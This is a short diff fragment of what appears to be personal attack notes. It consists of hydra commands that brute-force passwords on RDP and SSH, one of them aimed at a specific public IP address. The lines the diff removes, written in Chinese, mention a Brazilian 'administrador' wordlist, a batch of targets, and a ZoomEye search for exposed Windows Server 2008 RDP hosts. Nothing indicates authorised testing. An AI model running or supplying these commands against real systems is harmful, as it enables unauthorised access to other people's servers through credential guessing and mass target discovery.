@@ -4,10 +4,6 @@ hydra -l Administrator -P /tmp/password11416.txt -t 2  -s 4389 -e nsr -v rdp://2
 hydra -l Administrator -P password11416.txt   -s 33889 -e nsr -v -o save001.txt rdp://34.203.15.64
 
 
-1.字典 巴西：administrador
-2.一批target
-3. zoomeye: os:"Windows Server 2008"  servic:"rdp"
-
 
  hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.222.11 ssh
  hydra  -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.222.11 ssh
